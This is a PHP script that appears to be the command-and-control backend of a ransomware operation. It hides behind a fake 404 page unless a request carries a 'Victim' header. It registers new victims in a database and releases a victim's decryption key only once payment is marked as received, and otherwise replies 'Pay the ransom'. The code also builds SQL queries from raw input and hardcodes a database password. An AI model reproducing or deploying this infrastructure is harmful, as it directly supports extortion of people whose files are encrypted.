<?php
include('update_db.php');
$GLOBALS['sr'] = 0;

function Connection(){
	//Configuration of database
	$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
	if(!$dbconn)
	{
		echo "An error Ocurred!\n";
		exit;
	}
	return $dbconn;
}

function getRequestHeaders(){
	$headers = array();
	foreach($_SERVER as $key => $value){
		$headers[$key] = $value;
	}
	return $headers;
}

function checkValidity(){
	$headers = getRequestHeaders();
	foreach($headers as $header => $value){
		if($header == "HTTP_VICTIM" && $value=="Yes"){
			return 1;
		}
	}
	return 0;
}

function abort(){
	echo "Not reachable!";
}

function hide(){
	//404 page
	echo "<html>
		<head>
			<title>404 Error - Page Not Found</title>
		</head>
		<body>404 Error - Page Not Found!</body>
	</html>";
}

function returnDecrypted($dbconn,$key,$id){
	$private_key = file_get_contents("private.pem");
    $res = openssl_get_privatekey($private_key,getenv('RANSOM_KEY'));
    $tmp = str_replace('-','+',$id);
    openssl_private_decrypt(base64_decode($tmp),$dec,$res);
    $id = $dec;
	$query = "SELECT payment_status from ransomware_details where id='$id';";
	$result = pg_query($dbconn,$query);
	$tmp = pg_fetch_row($result)[0];
	if($tmp == 'Yes'){
		$resStr = str_replace('-','+',$key);
		openssl_private_decrypt(base64_decode($resStr),$newsource,$res);
		echo "$newsource";
		update_database($id);
	}
	else if($tmp == 'No'){
		echo "Pay the ransom";
	}
	else{
		exit;
	}
}

function check1($dbconn){
	if( isset($_GET['decrypt']) && isset($_GET['id'])){
		$key = $_GET['decrypt'];
		$id = $_GET['id'];
		returnDecrypted($dbconn,$key,$id);
		return 1;
	}
	else{
		return 0;
	}
}

if(checkValidity()){
	$dbconn = Connection();
	if(check1($dbconn)){
		exit;
	}
	$result = pg_query($dbconn, "SELECT sr FROM ransomware_details ORDER BY id DESC LIMIT 1;");
	if(!$result){
		pg_close();
		abort();
		exit;
	}
	$sr_no=pg_fetch_row($result)[0];

	$result = pg_query($dbconn,"SELECT id from ransomware_details where sr="."$sr_no");
	if(!$result){
	    pg_close();
	    abort();
	    exit;
	}

	$id = pg_fetch_row($result)[0];
	$id = $id+1;

	$GLOBALS['sr'] = $sr_no;
	$GLOBALS['sr']=$GLOBALS['sr']+1;
	$sno = $GLOBALS['sr'];
	$query = "INSERT INTO ransomware_details (sr,id,payment_status) VALUES "."('$sno', '$id','No');";
	$result = pg_query($dbconn,$query);
	//echo $result;
	if(!$result){
		pg_close();
		abort();
		exit;
	}
	else{
		echo "$id";
		pg_close();
	}
}
else{
	hide();
}
?>
